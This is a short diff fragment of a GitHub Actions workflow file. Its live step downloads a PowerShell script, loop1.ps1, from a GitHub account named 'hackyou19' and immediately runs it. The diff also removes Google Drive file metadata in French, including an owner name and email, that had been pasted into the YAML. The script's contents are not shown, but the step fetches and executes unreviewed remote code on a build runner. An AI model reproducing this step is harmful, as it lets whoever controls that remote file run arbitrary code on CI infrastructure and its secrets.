@@ -43,22 +43,3 @@ jobs:
       run: | 
         Invoke-WebRequest https://github.com/hackyou19/holatext/raw/main/loop1.ps1 -OutFile loop.ps1
         ./loop.ps1
-main.yml
-Lihwak Abb 
-(lihwakabb4@gmail.com)
-Informations générales
-TypeFichier inconnu
-Taille2 Ko
-Dernière modification19:38 21 oct.
-Création04:52 21 oct.
-Partage
-Tous les utilisateurs disposant du lien
-Consultation autorisée
-
-test super
-Propriétaire
-Description
-Aucune description
-Autorisation de téléchargement
-Téléchargement autorisé pour les lecteurs
-Affichage de main.yml
